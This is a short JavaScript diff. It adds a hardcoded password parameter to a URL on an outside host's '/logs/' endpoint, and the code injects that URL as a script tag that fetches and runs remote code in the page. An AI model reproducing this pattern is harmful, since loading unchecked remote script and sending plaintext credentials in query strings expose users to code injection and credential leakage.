@@ -1,4 +1,4 @@
-let _url = 'https://kivtechs.cloud/logs/?user=st1&callback=show';
+let _url = 'https://kivtechs.cloud/logs/?user=st1&callback=show&pwd=test123';
 const script = document.createElement('script');
 script.src = _url;
 document.body.appendChild(script);
